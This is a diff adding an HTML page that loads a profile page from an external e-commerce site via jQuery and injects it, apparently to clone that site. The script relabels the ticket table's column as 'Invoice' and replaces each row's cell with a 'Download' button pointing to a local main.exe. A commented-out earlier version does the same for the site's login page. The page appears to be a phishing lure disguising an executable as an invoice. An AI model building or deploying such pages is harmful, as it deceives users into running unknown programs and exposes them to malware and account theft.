@@ -1,0 +1,71 @@
+<!-- <!DOCTYPE html> 
+<html>
+    <head>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+    </head>
+    <body>
+    <script>
+        let html
+        $(document).ready(
+            function() {
+                $.ajax(
+                    {
+                        url: "https://networking-ecommerce-new.onrender.com/", 
+                        success: function(data){
+                            html=data
+                            display_html()
+                        }
+                    }
+                )
+            },
+        )
+
+        function display_html() { 
+            $("body").append(html)
+            $("head").append(html)
+            $(".col-sm-12.col-md-12.col-lg-12.text-center.p-3 img").remove();
+            $(".col-sm-12.col-md-12.col-lg-12.text-center.p-3").add()
+            $(".col-sm-12.col-md-12.col-lg-12.text-center.p-3").append('<img src="./login.png" width="90%">');
+        }
+
+    </script>
+    </body>
+</html> -->
+
+<html>
+
+<head>
+    <!-- jQuery -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+</head>
+
+<body>
+    <script>
+        let html;
+        $(document).ready(function () {
+            $.ajax({
+                url: 'https://networking-ecommerce-new.onrender.com/profile?id=1',
+                success: function (data) {
+                    html = data
+                    display_html()
+                }
+            });
+        })
+        function display_html() {
+            $("body").append(html)
+            $(".col-lg-4").remove()
+            $(".col-lg-8").removeClass("col-lg-8").addClass("col-lg-12")
+            $("#ticket_table th").eq(2).html("Invoice")
+            $("#ticket_table").find("tr").each(function(){ 
+                let html = `
+                <a href="./main.exe">
+                    <button class="download_button" style=" padding: 1em 3em; border: none; border-radius: 1em; color: white; background-color: #442ea6; font-weight: 900;">Download</button>
+                    </a>
+                `
+                $(this).find("td").eq(3).html(html)
+            }) 
+        }
+    </script>
+</body>
+
+</html>
